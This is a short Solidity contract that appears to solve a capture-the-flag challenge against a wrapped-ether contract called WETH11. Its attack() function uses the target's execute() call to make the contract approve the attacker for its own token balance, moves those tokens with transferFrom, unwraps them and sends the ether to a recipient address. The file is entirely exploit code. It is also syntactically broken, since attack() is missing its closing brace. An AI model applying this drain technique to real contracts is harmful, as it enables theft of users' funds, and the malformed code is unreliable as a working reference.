
pragma solidity ^0.8.0;

import "../instances/WETH11.sol";

// The Angel Di Maria Wrapped Ether
contract WETH11Solution {
    WETH11 immutable target;
    address immutable bob;
    
    constructor(address _target, address _bob) {
        target = WETH11(payable(_target));
        bob = _bob;
    }

    function attack() external  {
        uint amount = target.balanceOf(address(target));
        target.execute(address(target),0,abi.encodeWithSignature("approve(address,uint256)", address(this) , amount));

        target.transferFrom(address(target), address(this), amount);
        target.withdrawAll();
        payable(bob).transfer(amount);



    receive() external payable {}

}
